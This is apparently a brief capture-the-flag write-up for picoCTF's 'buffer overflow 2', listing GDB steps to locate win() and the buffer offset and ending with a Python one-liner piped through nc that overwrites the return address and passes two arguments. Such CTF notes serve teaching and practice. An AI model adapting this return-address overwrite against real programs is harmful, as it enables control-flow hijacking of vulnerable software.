# buffer overflow 2

0. vuln.c _. we need to call win() with two arguments: 0xCAFEF00D, 0xFOODFOOD
1. GDB -> set breakpoint in vuln() after gets(), run and give a string of a's as input
2. `disas win`, `i f` & `x/100xg $ebp-200` give the following:
    - win() is at **0x08049296**
    - buffer starts at **ebp-0x6c**
3. We know that:
    - return address is at **ebp+4**
    - first arg is at **ebp+8**
4. The following works:

    ```shell
    python3 -c 'import sys; sys.stdout.buffer.write(b"A"*0x70 + b"\x96\x92\x04\x08" + b"B"*4 + b"\x0d\xf0\xfe\xca" + b"\x0d\xf0\x0d\xf0\n")' | nc saturn.picoctf.net 50486
    ```
